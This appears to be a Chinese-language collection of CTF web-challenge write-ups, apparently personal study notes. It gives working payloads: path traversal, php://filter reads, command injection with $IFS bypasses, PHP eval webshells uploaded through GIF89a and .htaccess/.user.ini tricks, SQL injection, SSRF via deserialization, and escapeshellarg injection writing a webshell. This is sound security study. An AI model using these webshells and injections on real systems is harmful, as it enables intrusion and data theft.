urldecode($page); $_page &#x3D; mb_substr( $_page, 0, mb_strpos($_page . &#39;?&#39;, &#39;?&#39;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; echo &quot;you can&#39;t see it&quot;; return false; &#125; &#125; if (! empty($_REQUEST[&#39;file&#39;]) &amp;&amp; is_string($_REQUEST[&#39;file&#39;]) &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;]) ) if内为真时进行文件包含 &#123; include $_REQUEST[&#39;file&#39;]; exit; &#125; else &#123; echo &quot;&lt;br&gt;&lt;img src&#x3D;\\&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;11&#x2F;01&#x2F;5bdb0d93dc794.jpg\\&quot; &#x2F;&gt;&quot;; &#125; 由于hint.php中提示flag在ffffllllaaaagggg中且whitelist中仅有source.php和hint.php 所以传入 file=hint.php?ffffllllaaaagggg 无回显 后多次利用../查看上级目录 最终payload为 file=hint.php?/../../../../ffffllllaaaagggg [极客大挑战 2019]Secret File进入后看到这个界面 查看源码可以找到Archive_room.php 发现这个页面 点击按钮后页面 尝试抓包发现secr3t.php 访问得到php代码 是文件包含，flag在flag.php中，过滤了../,tp,input,date. 利用php://filter绕过 构造file=php://filter/read=convert.base64-encode/resource=flag.php base64解码后得到flag 基础验证 进入后猜测用户名为admin 密码为123456进行抓包 发现存在一行Authorization: Basic YWRtaW46MTIzNDU2 猜测YWRtaW46MTIzNDU2为base64加密；进行解码 尝试通过bp用附件中的密码进行爆破， 为密码添加前缀为admin：且要进行base64加密的规则 爆破后发现存在一个长度不同与其他包的 进行发包查看其响应可发现flag 目录遍历进入后发现有四个目录， 依次寻找可找到flag.txt文件 ./ 表示当前目录../ 表示父级目录/ 表示根目录 目录遍历常见的是使用../来遍历目录 phpinfo进入后为这种页面 仔细查找后可发现flag 备份文件下载-网站源码 1.依次试试发现存在www.zip,下载压缩包后发现存在三个文件 查看flag的文件后发现其中不存在flag 尝试在网页中访问得到flag 2.御剑扫描 3.利用dirsearch工具扫描 python dirsearch.py -u http://challenge-c5753b902359b43f.sandbox.ctfhub.com:10080/ -e* bak文件进入页面后 于是查看/index.php.bak 得到文件 vim缓存 所以查看.index.php.swp可得到文件 之后在Linux系统中用命令 vim -r index.php.swp打开 .DS_Store根据题目查看后缀.DS_Store 得到一个文件 用记事本就可以查看看到 可得到flag git泄露 log题目中为git泄露可直接在后缀后加/.git 也可用dirsearch扫 用githack进行查看（百度里有几个githack没有办法用，弄了一下午） githack要用python2 得到一个文件夹进入后用git bash打开 利用git log可以查看历史提交记录 看到有init ，add flag，remove flag三次提交记录 猜测flag在add flag中，用git diff命令对比与add flag的差别，可得到flag； [ACTF2020 新生赛]Exec查看源码后不存在提示，尝试ping 127.0.0.1 ping通后再尝试ping 127.0.0.1|ls 看到index.php 多次用../查看上级目录 看见有flag文件 尝试查看127.0.0.1|cat ../../../flag 得到flag 也可以用cat /flag 题目利用了命令执行 管道符 1、|（就是按位或），直接执行|后面的语句 2、||（就是逻辑或），如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句 3、&amp;（就是按位与），&amp;前面和后面命令都要执行，无论前面真假 4、&amp;&amp;（就是逻辑与），如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令 5、Linux中 ; 前后都执行，无论前面真假，同&amp;， [ACTF2020 新生赛]Include题目是include猜测是文件包含； 点击tips后跳转到了file=flag.php 用php://input时提示 然后尝试用php://filter 构造payload ?file=php://filter/read=convert.base64-encode/resource=flag.php 最后用base64解码就能得到flag [极客大挑战 2019]Knife文件可上传知道文件上传的路径上传文件可以被访问上传文件可以被执行 进去看到这个界面感觉是一句话木马，然后用菜刀连接 试一下 连接成功 然后在根目录下发现flag的文件，进入后找到flag [极客大挑战 2019]Http进去后看到是个广告页，直接查看源码 发现有个Secret.php，进入之后 用bp抓包然后先加个Referer: https://www.Sycsecret.com 看到要用Syclover 浏览器 所以把User-Agent里的内容改成User-Agent: Syclover 提示要本地访问 所以加个X-Forwarded-For:127.0.0.1（我下了个fakeip的插件） http请求报头请求报头通知服务器关于客户端求求的信息，典型的请求头有： X-Forwarded-For 是一个 HTTP 扩展头部。用来表示 HTTP 请求端真实 IP。 Referer：表示这是请求是从哪个URL进来的 Host：请求的主机名，允许多个域名同处一个IP地址，即虚拟主机 User-Agent：发送请求的浏览器类型、操作系统等信息 Accept：客户端可识别的内容类型列表，用于指定客户端接收那些类型的信息 Accept-Encoding：客户端可识别的数据编码 Accept-Language：表示浏览器所支持的语言类型 Connection：允许客户端和服务器指定与请求/响应连接有关的选项，例如这是为Keep-Alive则表示保持连接。 Transfer-Encoding：告知接收端为了保证报文的可靠传输，对报文采用了什么编码方式。 [GXYCTF2019]Ping Ping Ping进入后先根据题目试一下?ip=127.0.0.1 再用ls查看发现存在flag.php和index.php两个文件 尝试直接查看flag.php发现空格被过滤 绕过空格方式 $&#123;IFS&#125;替换 $IFS$1替换 $&#123;IFS替换 %20替换 &lt;和&lt;&gt;重定向符替换 %09替换 $IFS是bash中的内部域分隔符，可以代替空格至于后面的$9数字是可以随意的 发现利用$IFS$1可以绕过，但flag也被过滤了 于是先查看index.php 百度之后找到一种利用内联的payload ?ip=127.0.0.1;cat$IFS$1 ls 将反引号内命令的输出作为输入执行 GXYCTF2019]Ping Ping Ping 做题总结_孙得劲的博客-CSDN博客 [GXYCTF2019]Ping Ping Ping {命令执行总结}_昂首下楼梯的博客-CSDN博客 一些其他的绕过方式 [RoarCTF 2019]Easy Calc进入后是个计算器，查看源码后发现 查看calc.php看到php代码 看到过滤掉了很多字符 尝试传入参数发现仅能传入数字 百度后得知这里设置了waf 可以利用php在解析字符串时会删除空白符并将某些字符转换为下划线的特性绕过 所以尝试在num前加空格 绕过成功 接下来尝试构造命令得到flag 利用scandir函数可读取目录 由于/被过滤 所以利用chr函数绕过 构造 [node3.buuoj.cn:26183/calc.php? num=print_r(scandir(chr(47)))](http://node3.buuoj.cn:26183/calc.php? num=print_r(scandir(chr(47)) 得到 看到有个f1agg 利用readfile或者file_get_contents查看这个文件 ? num=print_r(file_get_contents(chr(47).f1agg)) [极客大挑战 2019]Upload先做个一句话木马，上传后显示 用bp抓包然后修改Content-Type为image/jpeg Content-Type（内容类型），一般是指网页中存在的 Content-Type，用于定义网络文件的类型和网页的编码，决定浏览器将以什么形式、什么编码读取这个文件， 放包后又显示不能为php 百度得知绕过后缀的有文件格式有php, ,php4,php5,phtml.pht 试一试 发现可用phtml绕过 但又提示 把文件内容改为 又提示 在一句话木马前加个文件头GIF89a(GIF89a图片头文件欺骗) Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.phtml&quot;Content-Type: image/jpeg GIF89a @eval($_POST[\"a\"]); 上传成功 猜测上传地址为/upload/ 菜刀连接 在根目录下找到flag [ACTF2020 新生赛]Upload文件上传，先传个一句话木马试试 弹出js， 看一下源码 把这个事件remove掉 上传后又提示 试试改改后缀名，发现phtml可以成功上传 菜刀连接 在虚拟终端中利用cat命令找到flag [ACTF2020 新生赛]BackupFile根据题目得知有.bak的备份文件，访问一下index.php.bak得到备份文件 代码审计可知要传入key的值与str的值相等，且key只能为数字类型 因为==是弱类型比较，根据php的性质可传入?key=123 得到flag [极客大挑战 2019]BuyFlag到payflag的页面发现有两个条件 查看源码 抓个包 将user改为1可满足第一个条件 之后要以post方式传入一个值令其等于404且不能为纯数字 所以post password=404a 提示要pay for the flag 猜测要post进money=100000000 传入后提示数字过长 采用科学计数法，得到flag [SUCTF 2019]CheckIn进入后看起来像是上传一句话木马的题 先传一个正常的 提示illegal suffix!非法后缀 改个后缀名试试 改成.jpg文件后成功绕过，但又提示&lt;? in contents! 猜测&lt;?被过滤了 修改后 最后再加个GIF89a文件头，绕过最后一个exif_imagetype函数的检测 虽然成功上传了但菜刀无法连接 百度一下wp .user.ini 1、auto_prepend_file 在页面顶部加载文件 2、auto_append_file 在页面底部加载文件 某网站限制不允许上传.php文件，可以上传一个.user.ini，再上传一个图片马，包含起来进行getshell。在含有.user.ini的文件夹下要有正常的php文件 再上传一个.user.ini 上传后我们访问此目录下的任何一个文件时，都会去包含first.jpg, 根据其返回的地址用菜刀连接 找到flag [ZJCTF 2019]NiZhuanSiWei 看见file_get_contents(),利用伪协议data://text/plain;base64绕过 再利用php://filter读取useless内的内容 解码后 可知flag在flag.php中 试图让file=flag.php 看到unserialize函数，利用php反序列化 构造payload ？text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;} 查看源码找到flag [极客大挑战 2019]PHP页面中提示有备份文件，御剑扫一遍 找到存在www.zip 重点在class.php和index.php中 所以要传入一个select参数，利用反序列化让username=admin password=100 因为username和password两个为private类型 所以有隐藏的空格符 select=O:4:&quot;Name&quot;:3:{s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;}&quot; [MRCTF2020]你传你🐎呢先传个.htaccess文件，为了解析图片码 htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。 笼统地说，.htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。 SetHandler application&#x2F;x-httpd-php &#x2F;&#x2F;该语句作用是让Apache将其他类型文件均以php格式解析 再传个一句话木马，然后bp抓包 只有将其改为图片的类型才能成功上传 根据返回的路径用菜刀连接 [MRCTF2020]Ez_bypass进入后代码审计 先get进两个md5值相等的内容 md5无法处理数组，会返回NULL，使其相等 再根据php的特性post进passwd=1234567a绕过if 获得flag [护网杯 2018]easy_tornado从提示可以看出来这个tornado是一个python的模板，在web使用的时候给出了四个文件，可以访问，从提示中和url中可以看出，访问需要文件名+文件签名（长度为32位，计算方式为md5(cookie_secret + md5(filename))）; flag文件名题目已给出 /fllllllllllag 所以要做的就是要获得到cookie值 这里是采用模板注入的方式 这里可以猜出来存在模板注入漏洞而且应该存在过滤 然后百度看一下wp 在Tornado的前端页面模板中，Tornado提供了一些对象别名来快速访问对象，具体定义可以[参考Tornado官方文档](http:&#x2F;&#x2F;tornado.readthedocs.org&#x2F;en&#x2F;latest&#x2F;guide&#x2F;templates.html#template-syntax)！ 所以可以利用这个来读取cookie_secret 然后对其进行md5加密就能得到flag了 [HCTF 2018]adminHCTF2018-admin_迷风小白-CSDN博客 注册个账户登录后可以在修改密码页面的源码注释中找到提示 查看可以找到题目源码 一、 session伪造 flask中session是存储在客户端cookie中的，也就是存储在本地。flask仅仅对数据进行了签名。众所周知的是，签名的作用是防篡改，而无法防止被读取。而flask并没有提供加密操作，所以其session的全部内容都是可以在客户端读取的 找到session后利用py脚本进行解码 依照题意可以猜测只有用admin账户登录才能得到flag，所以要伪造session来使我们被认为是admin账户 重新编码session时需要用到secret_key可以在config.py中找到 伪造session 修改后刷新页面得到flag 二：Unicode欺骗 代码审计可以看出在登录注册和修改密码时都存在用户名的小写转换 看一下strlower Twisted版本为10.2.0，而目前(2020/10/28)Twisted最新版本已有20.3.0，这里使用的版本非常旧10.2.0版的nodeprep.prepare()对一些特殊的Unicode编码处理后会得到一个正常的字符。可以知道当使用了nodeprep.prepare()函数之后，如果我们先使用unicode的编码的字符，比如说 ᴬ ，使用该函数之后，他会先变成大写的A，再使用一次就会变成小写的a。 所以可以注册一个ᴬᴰᴹᴵᴺ用户再通过登录和修改密码两次令其变为admin Basic Latin — ✔️ ❤️ ★ Unicode Character Table (unicode-table.com)可以从这个网站查字符 这里登录之后进行修改密码，则通过小写转换就会变为修改admin账户的密码 三、弱密码 用户admin密码为123 爆破或者试一试就能试出来密码 [BJDCTF2020]Easy MD5进入后只有一个提交框，没啥思路，先用bp抓个包 看见有个hint select * from &#39;admin&#39; where password=md5($pass,true) 然后猜这里应该要利用sql注入的，但我不会了x 看了一下说是要用ffifdyop来绕过，因为这个字符串经过md5之后会变成 276f722736c95d99e921722cf9ed621c，这个字符串前几位刚好是&#39; or &#39;6 就会构成万能密码 成功进入下一步，先查看源码 利用md5不能处理数组会返回null的特性就能绕过，接下来进行代码审计 同样可以利用md5不能处理数组的特性 [CISCN2019 华北赛区 Day2 Web1]Hack Worldsql注入，先用fuzz测一下过滤（buu的网站好像有post限制，所以post到后面之后会显示提交次数过多，而且不知道是不是bp的问题有些没有过滤的也会被显示为被过滤了 这里应该要采用bool盲注的方式，但是过滤的东西有点多 因为空格被过滤了所以要利用（）来代替空格 抄了个脚本 感觉是很简单的盲注，然后要利用python编脚本 [GXYCTF2019]BabySQli GXYCTF2019]BabySQli——“绕过md5比较”_WHOAMIAnony的博客-CSDN博客 当用户名为admin时，提示密码错误，因此能知道用户名为admin 登录后跳转到search.php中，在源码里存在一个进行base加密的提示 sql注入，先fuzz看一下过滤 然后可以利用大写绕过查到共有3列（其实直接union试也可以 之后要利用联合注入 在联合查询并不存在的数据时，联合查询就会构造一个虚拟的数据。 后端代码 &lt;?php$row; $pass&#x3D;$_POST[&#39;pw&#39;]; if($row[&#39;username&#39;]&#x3D;&#x3D;’admin’)&#123; if($row[&#39;password&#39;]&#x3D;&#x3D;md5($pass))&#123; echo $flag; &#125;else&#123; echo “wrong pass!”; &#125;&#125; else&#123; echo “wrong user!”;&#125; 所以可以在联合查询时构造虚拟的数据利用这个数据进行登录操作 username&#x3D;0&#39; union select 1,&#39;admin&#39;,&#39;202cb962ac59075b964b07152d234b70&#39; # password&#x3D;123 得到flag [网鼎杯 2018]Fakebook先join一下，然后源码里有 这里过滤了union select 中间可以加个注释符来当空格来绕过去 这个页面存在注入点，最终可以查到这些 这里能看出来data是个序列化后的结果，但是不知道有什么用 然后扫一下发现 有robots.txt备份文件 &lt;?php class UserInfo &#123; public $name &#x3D; &quot;&quot;; public $age &#x3D; 0; public $blog &#x3D; &quot;&quot;; public function __construct($name, $age, $blog) &#123; $this-&gt;name &#x3D; $name; $this-&gt;age &#x3D; (int)$age; $this-&gt;blog &#x3D; $blog; &#125; function get($url) &#123; $ch &#x3D; curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $output &#x3D; curl_exec($ch); $httpCode &#x3D; curl_getinfo($ch, CURLINFO_HTTP_CODE); if($httpCode &#x3D;&#x3D; 404) &#123; return 404; &#125; curl_close($ch); return $output; &#125; public function getBlogContents () &#123; return $this-&gt;get($this-&gt;blog); &#125; public function isValidBlog () &#123; $blog &#x3D; $this-&gt;blog; return preg_match(&quot;&#x2F;^(((http(s?))\\:\\&#x2F;\\&#x2F;)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]&#123;2,6&#125;(\\:[0-9]+)?(\\&#x2F;\\S*)?$&#x2F;i&quot;, $blog); &#125; &#125; 好，看不懂了（ 抄一下别人的分析 &lt;?php class UserInfo &#123; public $name &#x3D; &quot;&quot;; public $age &#x3D; 0; public $blog &#x3D; &quot;&quot;; public function __construct($name, $age, $blog) &#123; $this-&gt;name &#x3D; $name; $this-&gt;age &#x3D; (int)$age; $this-&gt;blog &#x3D; $blog; &#125; function get($url) &#123; $ch &#x3D; curl_init(); &#x2F;*curl_init()：初始化一个 cURL 会话并且全部的选项都被设置后被调用*&#x2F; curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); &#x2F;* curl_setopt — 为给定的cURL会话句柄设置一个选项。 说明： bool curl_setopt ( resource $ch , int $option , mixed $value ) 参数: ch：由 curl_init() 返回的 cURL 句柄。 option：需要设置的CURLOPT_XXX选项。 value：将设置在option选项上的值。 对于下面的这些option的可选参数，value应该被设置一个bool类型的值： CURLOPT_RETURNTRANSFER：将curl_exec()获取的信息以文件流的形式返回，而不是直接输出。 对于下面的这些option的可选参数，value应该被设置一个string类型的值： CURLOPT_URL：需要获取的URL地址，也可以在curl_init()函数中设置。 ################### 文件流的形式:指的是在传递过程中的文件,比如你上传一张图片,那么他不是以一个完整的图片传输的,是将文件按特定编码的字符传输.这个就是文件流 *&#x2F; $output &#x3D; curl_exec($ch); &#x2F;*curl_exec ：执行 cURL 会话*&#x2F; $httpCode &#x3D; curl_getinfo($ch, CURLINFO_HTTP_CODE); &#x2F;* curl_getinfo — 获取一个cURL连接资源句柄的信息 说明： mixed curl_getinfo ( resource $ch [, int $opt &#x3D; 0 ] )获取最后一次传输的相关信息。 参数： ch 由 curl_init() 返回的 cURL 句柄。 opt：这个参数可能是以下常量之一: CURLINFO_HTTP_CODE : 最后一个收到的HTTP代码 *&#x2F; if($httpCode &#x3D;&#x3D; 404) &#123; return 404; &#125; curl_close($ch); return $output; &#125; public function getBlogContents () &#123; return $this-&gt;get($this-&gt;blog); &#125; public function isValidBlog () &#123; $blog &#x3D; $this-&gt;blog; return preg_match(&quot;&#x2F;^(((http(s?))\\:\\&#x2F;\\&#x2F;)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]&#123;2,6&#125;(\\:[0-9]+)?(\\&#x2F;\\S*)?$&#x2F;i&quot;, $blog); &#125; cURL是一个利用URL语法在命令行下工作的文件传输工具，1997年首次发行。它支持文件上传和下载，所以是综合传输工具，但按传统，习惯称cURL为下载工具。 cURL还包含了用于程序开发的libcurl。 PHP支持的由Daniel Stenberg创建的libcurl库允许你与各种的服务器使用各种类型的协议进行连接和通讯。 libcurl目前支持http、https、ftp、gopher、telnet、dict、file和ldap协议。libcurl同时也支持HTTPS认证、HTTP POST、HTTP PUT、 FTP 上传(这个也能通过PHP的FTP扩展完成)、HTTP 基于表单的上传、代理、cookies和用户名+密码的认证。 PHP中使用cURL实现Get和Post请求的方法 这些函数在PHP 4.0.2中被引入。 新知识：这里利用了ssrf漏洞 SSRF漏洞攻击原理及防御方案 - FreeBuf网络安全行业门户 SSRF 漏洞记录_发哥微课堂-CSDN博客 SSRF漏洞(原理&amp;绕过姿势) - T00ls.Net SSRF（Server-Side Request Forgery）也属于应用层上的一个漏洞类型，用一个最简单的例子来理解这个漏洞：比如一个添加图文的功能，填入标题内容和封面图然后提交在网站前台显示，对于这个功能的图片它除了可以让你上传以外，还支持填入远程图片地址，如果你填入了远程的图片地址，则该网站会加载远程图过来进行显示，而如果程序写法不严谨或者过滤不严格，则加载图片地址的这个功能可能就可以包含进行一些恶意的脚本文件，或者你输入内网的 ip 或者一些系统的文件都会被解析执行，这个我们一般叫它 SSRF 即服务端请求伪造。 curl 使用的经典过程，初始化，然后设置访问的地址，随后执行，最后关闭。 将URL换成file://的形式，就可以读取本地文件。 这里我们要访问的是flag.php，所以按照之前sql注入得出来的序列化内容进行修改 最终payload为 ?no&#x3D;-1%20union&#x2F;**&#x2F;select 1,(select%20group_concat(no,username,passwd,data)%20from%20users),3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:123;s:4:&quot;blog&quot;;s:27:&quot;file:&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;&#39; 看一下源码，找到flag [GYCTF2020]Blacklist这个看起来和强网杯那个有点像 同样也是堆叠注入 可以用 1&#39;;show tables;#查表 flag应该就在flaghere这个表里 看一下列名 想查看的时候发现存在过滤 这里可以利用headler HANDLER … OPEN语句打开一个表，使其可以使用后续HANDLER … READ语句访问，该表对象未被其他会话共享，并且在会话调用HANDLER … CLOSE或会话终止之前不会关闭 最终payload：1&#39;;handler FlagHere open;handler FlagHere read first;handler FlagHere close;# （试了一下利用headler强网杯的拿到也能注出来 关于handler命令转载自:https://blog.csdn.net/jesseyoung/article/details/40785137 mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。HANDLER语句提供通往表的直接通道的存储引擎接口，可以用于MyISAM和InnoDB表。 基本语法： HANDLER tbl_name OPEN [ [AS] alias] HANDLER tbl_name READ index_name &#123; &#x3D; | &lt;&#x3D; | &gt;&#x3D; | &lt; | &gt; &#125; (value1,value2,...) [ WHERE where_condition ] [LIMIT ... ] HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125; [ WHERE where_condition ] [LIMIT ... ] HANDLER tbl_name READ &#123; FIRST | NEXT &#125; [ WHERE where_condition ] [LIMIT ... ] HANDLER tbl_name CLOSE 通过HANDLER tbl_name OPEN打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。通过HANDLER tbl_name READ FIRST获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。通过HANDLER tbl_name CLOSE来关闭打开的句柄。 通过索引去查看的话可以按照一定的顺序，获取表中的数据。通过HANDLER tbl_name READ index_name FIRST，获取句柄第一行（索引最小的一行），NEXT获取下一行，PREV获取前一行，LAST获取最后一行（索引最大的一行）。 通过索引列指定一个值，可以指定从哪一行开始。通过HANDLER tbl_name READ index_name = value，指定从哪一行开始，通过NEXT继续浏览。 如果我们不想浏览一个表的所有行，可以使用where和limit子句。 [GXYCTF2019]BabyUpload这个和之前一个文件上传的题差不多，上传时过滤了ph后缀名，所以要上传个图片马，同时还要上传个.htaccess文件解析图片马，用bp抓包把类型改成image/jpeg就行 然后菜刀练一下在根目录里就能找到flag [BUUCTF 2018]Online Tool先直接贴参考的文章了 [BUUCTF__BUUCTF 2018]Online Tool_题解_风过江南乱的博客-CSDN博客 [BUUCTF 2018]Online Tool_沐目的博客-CSDN博客 谈谈escapeshellarg参数绕过和注入的问题 (lmxspace.com) PHP escapeshellarg()+escapeshellcmd() 之殇 (seebug.org) [2020/7/08 - BUUCTF 2018]Online Tool - nmap\\escapeshellarg与escapeshellcmd连用_M4xlmum的博客-CSDN博客 先是代码审计，又是没见过的东西 第一个if语句好像没啥用 在PHP 中使用 *$_SERVER[&quot;REMOTE_ADDR&quot;]* 来取得客户端的 IP地址，但如果客户端是使用代理服务器来访问，那取到的就 是代理服务器的 IP 地址，而不是真正的客户端 IP 地址。要想透过代理服务器取得客户端的真实 IP 地址，就要使用 *$_SERVER[&quot;HTTP_X_FORWARDED_FOR&quot;]* 来读取。 不过要注意的事，并不是每个代理服务器都能用 $_SERVER[&quot;HTTP_X_FORWARDED_FOR&quot;] 来读取客户端的真实IP，有些用此 方法读取到的仍然是代理服务器的 IP。 第二个if语句是要求传入一个参数然后利用escapeshellarg和escapeshellcmd两个函数的漏洞实现system命令执行 &#96;escapeshellarg&#96;，会在字符串中所有的单引号（包括成对存在闭合的）前添加一个&#96;&#39;\\&#39;&#96; ，若已经用&#96;\\&#96;转义，则会用并且用&#96;&#39;\\&#39;&#96; 替换&#96;\\&#96;，最后将整个变量用单引号包裹。 escapeshellcmd&#96;，会将字符串中未被转义的双引号或单引号转义（成对存在闭合的双引号或单引号除外）若已被转义，则用&#96;\\\\\\&quot;&#96;或&#96;\\\\\\&#39;&#96;替&#96;\\&quot;&#96;或&#96;\\&#39; 这个漏洞类似这种 mkdir命令是Linux中的新建文件夹 chdir改变目录 最后就是system的命令执行了，这里面是nmap的一些命令 -T5 :扫描等级,越大越快,越快越不安全,最好设置为-T4 -sT :TCP connent 扫描,不太安全(留下记录信息),而且速度较慢,一般先使用-sS测试 -Pn :禁用ping -host-timeout 2:设置扫描一台主机的时间，以毫秒为单位。 -F :快速扫描模式，只扫描在nmap-services文件中列出的端口。 -oG test.txt: 将扫描结果生成 test.txt 文件 接下来就是想办法利漏洞给里面传入一个一句话木马 payload &#39;&lt;?php eval($_POST[&quot;a&quot;]);?&gt; -oG 1.php &#39; 然后经过escapeshellarg和escapeshellcmd两个函数就会变成类似这种 &#39; &#39;\\\\&#39;&#39;\\&lt;\\?php eval\\(\\)\\;\\?\\&gt; -oG 1.php &#39;\\\\&#39;&#39; &#39; 这里单引号都闭合了不会影响到传入的一句话木马 之后就可以用菜刀连接找flag了 e9612257fa1c5134d014e95a7440d357 这是上传后的地址 菜刀连一下http://d26a51d3-a34a-46e5-9be3-80b3a129befb.node4.buuoj.cn/ e9612257fa1c5134d014e95a7440d357/1.php 根目录找到flag [RoarCTF 2019]Easy Java首先是个登录框 看一下help的内容 试试抓包然后改一下请求方式后会下载一个word文档，没啥用 这里有个漏洞WEB-INF/web.xml泄露 WEB-INF主要包含一下文件或目录: &#x2F;WEB-INF&#x2F;web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。 &#x2F;WEB-INF&#x2F;classes&#x2F;：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中 &#x2F;WEB-INF&#x2F;lib&#x2F;：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件 &#x2F;WEB-INF&#x2F;src&#x2F;：源码目录，按照包名结构放置各个java文件。 &#x2F;WEB-INF&#x2F;database.properties：数据库配置文件 漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码 漏洞成因 通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。一般情况，jsp引擎默认都是禁止访问WEB-INF目录的，Nginx 配合Tomcat做均衡负载或集群等情况时，问题原因其实很简单，Nginx不会去考虑配置其他类型引擎（Nginx不是jsp引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改Nginx配置文件禁止访问WEB-INF目录就好了： location ~ ^&#x2F;WEB-INF&#x2F;* &#123; deny all; &#125; 或者return 404; 或者其他！ 漏洞利用 漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码 所以先访问一下WEB-INF/web.xml 这个路径com.wm.ctf.IndexController应该和flag有关 所以试试访问一下 看到有块类似base64 解码得到flag [GXYCTF2019]禁止套娃[(1条消息) BUU-WEB-GXYCTF2019]禁止套娃_TzZzEZ-web的博客-CSDN博客 [GXYCTF2019]禁止套娃 - 王叹之 - 博客园 (cnblogs.com) 题目存在git泄露，用GitHack扫一下得到源码 可以猜到这里利用了eval进行命令执行，但是过滤了很多东西 1.需要以GET形式传入一个名为exp的参数。如果满足条件会执行这个exp参数的内容。 2.过滤了常用的几个伪协议，不能以伪协议读取文件。 3.(?R)引用当前表达式，后面加了?递归调用。只能匹配通过无参数的函数。 4.正则匹配掉了et&#x2F;na&#x2F;info等关键字，很多函数都用不了。 5：eval($_GET[&#39;exp&#39;]); 典型的无参数RCE PHP Parametric Function RCE · sky&#39;s blog (skysec.top)关于无参数rce 首先要读取目录内容， 可以用print_r(scandir(&#39;.&#39;)); 但是因为不能传参，所以要想把.用函数代替 这里有两个函数可以利用 localeconv() 函数返回一包含本地数字及货币格式信息的数组。而数组第一项就是. current() 返回数组中的当前单元, 默认取第一个值 所以current(localeconv())永远是个. 也就可以用print_r(scandir(current(localeconv())));来读目录 可以看到flag就在flag.php中 现在要想办法把它读出来 这里可以利用array_reverse()和next函数 通过array_reverse() 函数返回翻转顺序的数组。（反转之后flag.php被放在第二个数组之中）next() 函数将内部指针指向数组中的下一个元素，并输出。payload为： ？exp&#x3D;show_source(next(array_reverse(scandir(pos(localeconv()))))); 也可以利用 array_flip()交换数组的键和值 array_rand()从数组中随机取出一个或多个单元 最后再利用readfile函数读出文件或者用show_source让它高亮显示 由于array_rand是随机的，所以要多刷新几次才可能会显示flag.php的内容 [GWCTF 2019]我有一个数据库御剑是真的不好用。。。phpmyadmin路径死活扫不出来 这里phpmyadmin版本是4.8.1 由于phpmyadmin4.8.0-4.8.1存在文件包含漏洞 直接用payload打 ?target=db_datadict.php%253f/../../../../../../../../flag [BJDCTF2020]The mystery of ip这道题第一眼看上去像是本地访问的题目 但是hint有感觉不太像 抓包修改xff头后就没思路了，查了一下发现是smarty模板注入 看到这里支持逻辑运算，可以直接解析，所以就可以利用系统命令来读flag Smarty SSTI利用 (1条消息) PHP的模板注入（Smarty模板）_WHOAMIAnony的博客-CSDN博客_smarty模板注入 Smarty是基于PHP开发的，对于Smarty的SSTI的利用手段与常见的flask的SSTI有很大区别。 漏洞确认 一般情况下输入{$smarty.version}就可以看到返回的smarty的版本号。 常规利用方式 Smarty支持使用&#123;php&#125;&#123;/php&#125;标签来执行被包裹其中的php指令，最常规的思路自然是先测试该标签。 {literal} 标签 &#123;literal&#125;可以让一个模板区域的字符原样输出。 这经常用于保护页面上的Javascript或css样式表，避免因为Smarty的定界符而错被解析。 若该题环境为php5，则可以 &lt;script&gt;language&#x3D;&quot;php&quot;&gt;phpinfo();&lt;&#x2F;script&gt; 静态方法 通过self获取Smarty类再调用其静态方法实现文件读写被网上很多文章采用。 在3.1.30的Smarty版本中官方已经把该静态方法删除 {if}标签官方文档中看到这样的描述： Smarty的{if}条件判断和PHP的if非常相似，只是增加了一些特性。每个{if}必须有一个配对的{/if}，也可以使用{else} 和 {elseif}，全部的PHP条件表达式和函数都可以在if内使用，如||, or, &amp;&amp;, and, is_array(), 等等，如：{if is_array($array)}{/if} [BJDCTF2020]ZJCTF，不过如此第一部分 可以用伪协议读取，但是不知道为什么我用hackbar时没成功 也可以用这个payload 